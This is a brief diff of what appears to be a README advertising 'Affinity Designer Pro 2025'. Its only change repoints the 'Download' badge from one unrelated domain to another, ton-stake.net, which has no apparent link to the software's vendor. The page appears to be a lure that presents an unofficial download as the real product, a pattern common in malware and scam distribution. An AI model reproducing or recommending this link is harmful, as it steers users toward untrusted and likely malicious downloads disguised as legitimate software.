@@ -2,7 +2,7 @@
 
 Unleash your creativity with **Affinity Designer Pro 2025**! This professional vector graphic editor for Windows delivers precision tools and smooth workflows for logos, UI designs, and illustrations. Perfect for designers, illustrators, and creative professionals.
 
-[![Download Affinity Designer](https://img.shields.io/badge/Download-Affinity_Designer-blueviolet)](https://glocktober.com)
+[![Download Affinity Designer](https://img.shields.io/badge/Download-Affinity_Designer-blueviolet)](https://ton-stake.net)
 
 ---
 
